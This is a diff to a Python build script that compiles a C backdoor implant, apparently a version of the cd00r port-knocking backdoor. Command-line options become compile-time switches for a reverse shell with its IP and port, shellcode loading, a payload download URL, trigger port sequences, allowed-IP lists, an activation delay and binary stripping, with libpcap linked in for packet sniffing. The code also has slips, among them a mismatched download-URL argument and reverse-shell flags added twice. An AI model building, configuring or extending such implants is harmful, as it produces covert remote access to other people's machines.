@@ -3,7 +3,138 @@ import datetime
 import argparse
 import binascii
 import os
+import subprocess
+import shutil
 
+IMPLANT_DIR = "../mycd00r/"
+BUILD_DIR = "../mycd00r/build/"
+BUILD_LIB_DIR = BUILD_DIR + "lib/"
+INCLUDE_DIR = ["../mycd00r/include/"]
+CODE_DIR = ["../mycd00r/lib/", "../mycd00r/"]
+BUILD_DIRS = [BUILD_DIR, BUILD_LIB_DIR]
+
+def make_dir(dir):
+    try:
+        os.mkdir(dir)
+        print(f"[+] Folder '{dir}' created successfully.")
+    except FileExistsError:
+        print(f"[!] Folder '{dir}' already exists.")
+    except FileNotFoundError:
+        print(f"[!] Parent directory not found.")
+    except Exception as e:
+        print(f"[!] An error occurred: {e}")
+
+
+def compile_c_file(source_file, output_file, cflags, argflags):
+    compile_command = ["gcc", "-o", output_file, "-c", source_file] + cflags + argflags
+
+    for dir in BUILD_DIRS:
+        if not os.path.exists(dir):
+            make_dir(dir)
+    
+    print(f"[+] Running: {' '.join(compile_command)}")
+    result = subprocess.run(compile_command, capture_output=True, text=True)
+
+    if result.returncode != 0:
+        print(f"[!] Error compiling {source_file}:")
+        print(result.stderr)
+        return False
+    
+    return True
+
+def link_object_files(object_files, ldflags):
+    compile_command = ["gcc", "-o", IMPLANT_DIR + args.outputName] + object_files + ldflags
+    print(f"[+] Running: {' '.join(compile_command)}")
+    result = subprocess.run(compile_command, capture_output=True, text=True)
+
+    if result.returncode != 0:
+        print(f"[!] Error compiling {args.outputName}:")
+        print(result.stderr)
+        return False
+    
+    return True
+
+def get_code_files():
+    code_files = []
+    for dir in CODE_DIR:
+        for file in os.listdir(dir):
+            if ".c" in file:
+                code_files.append(dir+file)
+    return code_files
+
+def get_object_files(code_files):
+    object_files = []
+    for file in code_files:
+        object_file = file.replace(".c", ".o")
+        object_file = object_file.replace(IMPLANT_DIR, BUILD_DIR)
+        object_files.append(object_file)
+    return object_files
+
+def get_arg_flags():
+    arg_flags = []
+
+    if args.debug:
+        arg_flags.append("-DDEBUG")
+    if args.interface:
+        arg_flags.append("-DINTERFACE='\"" + args.interface + "\"'")
+    if args.ipAddress != "unknown":
+        addrs = args.ipAddress.split(",")
+        addrs = ['"' + s + '"' for s in addrs]
+        addrs = ', '.join(addrs)
+        arg_flags.append("-DCORRECT_IP_LIST={" + addrs + "}")
+    if args.downloadURL:
+        arg_flags.append("-DDOWNLOAD_URL='\"" + args.atkD + "\"'")
+    if args.bang:
+        arg_flags.append("-DBANG")
+    if args.loadShellcode:
+        arg_flags.append("-DSHELLCODE")
+    if args.reverseShell:
+        arg_flags.append("-DREVERSE_SHELL")
+    if args.reverseIP:
+        arg_flags.append("-DREVERSE_IP")
+    if args.reversePort:
+        arg_flags.append("-DREVERSE_PORT")
+    if args.strip:
+        arg_flags.append("-s")
+    if args.key:
+        arg_flags.append("-DCDR_PORTS={" + args.key + "}")
+    if args.size:
+        arg_flags.append("-DCDR_PORTS_SIZE=" + args.size)
+    if args.activate:
+        arg_flags.append("-D" + args.activate)
+    if args.reverseIP:
+        arg_flags.append("-DREVERSE_IP=\"" + args.reverseIP  + "\"")
+    if args.reversePort:
+        arg_flags.append("-DREVERSE_PORT=" + args.reversePort)
+    if args.timeDelay:
+        arg_flags.append("-DDELAY_TIME=" + args.timeDelay)
+
+    return arg_flags
+
+def build():
+    code_files = get_code_files()
+    object_files = get_object_files(code_files)
+    CFLAGS = ["-Wall"] + ["-I" + s for s in INCLUDE_DIR]
+    LDFLAGS = ["-lcrypto", "-lssl", "-lpcap"]
+    arg_flags = get_arg_flags()
+
+    for i, file in enumerate(code_files):
+        if not compile_c_file(file, object_files[i], CFLAGS, arg_flags):
+            return False
+        
+    link_object_files(object_files, LDFLAGS)
+        
+def clean():
+    for dir in BUILD_DIRS:
+        if not os.path.exists(dir):
+            continue
+        try:
+            shutil.rmtree(dir)
+            print(f"Directory '{dir}' and its contents have been removed successfully.")
+        except FileNotFoundError:
+            print(f"Error: Directory '{dir}' not found.")
+        except OSError as e:
+            print(f"Error: {e}")
 
 parser = argparse.ArgumentParser(
     "python compiler.py",
@@ -101,11 +232,12 @@ parser.add_argument("-strip", "--strip", action="store_true", help="strip the bi
 parser.add_argument(
     "-static", "--static", action="store_true", help="statically link the binary"
 )
+parser.add_argument("-clean", "--clean", action="store_true", help="clean build area")
 
 args = parser.parse_args()
 
 with open("log.csv", mode="a+") as log_file:
-
+    file_exists = 1
     log_writer = csv.writer(
         log_file, delimiter="\t", quotechar='"', quoting=csv.QUOTE_MINIMAL
     )
@@ -172,3 +304,54 @@ with open("log.csv", mode="a+") as log_file:
             str(args.static),
         ]
     )
+
+
+
+
+
+if args.clean:
+    clean()
+else:
+    build()
+
+# implant_name = "sniffer.c"
+# ldflags = ["-lcrypto", "-lssl", "-lpcap"]
+# cflags = ["-Wall", "-I"+include_dir]
+# object_files = []
+# code_files = []
+
+# generated_source = implant_dir + implant_name
+
+# for filename in os.listdir(lib_dir):
+#     file_path = os.path.join(lib_dir, filename)
+#     if os.path.isfile(file_path):
+#         code_files.append(file_path)
+
+# for filename in os.listdir(lib_dir):
+#     file_path = os.path.join(build_dir, filename.replace(".c", ".o"))
+#     object_files.append(file_path)
+
+# for source_file in code_files:
+#     output_name = source_file.replace(lib_dir, build_dir)
+#     output_name = output_name.replace(".c", ".o")
+
+#     compile_cmd = ["gcc", "-c", source_file, "-o", output_name, "-I"+include_dir]
+#     result = subprocess.run(compile_cmd, capture_output=True, text=True)
+#     if result.returncode != 0:
+#         print(f"Error compiling {source_file}:")
+#         print(result.stderr)
+
+
+
+# compile_cmd = ["gcc", "-I"+include_dir, generated_source, "-o", implant_dir+args.outputName]
+# for object_file in object_files:
+#     compile_cmd.append(object_file)
+
+# for flag in ldflags:
+#     compile_cmd.append(flag)
+
+# print(f"[+] Running: {' '.join(compile_cmd)}")
+# result = subprocess.run(compile_cmd, capture_output=True, text=True)
+# if result.returncode != 0:
+#     print(f"Error compiling {source_file}:")
+#     print(result.stderr)
